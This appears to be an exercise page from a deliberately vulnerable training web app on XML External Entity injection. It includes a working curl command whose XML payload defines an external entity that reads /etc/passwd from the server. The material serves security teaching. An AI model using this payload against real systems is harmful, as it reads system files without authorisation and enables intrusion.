XML External Entity (XXE) Injection

Submit an XML payload — the server parses it and echoes back the <name> and <city> fields.

On the low level, raw XML is accepted with no content-type or size checks.
Try injecting an external entity payload via curl:

curl -X POST {{.weburl}}xxe \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name><city>test</city></root>'
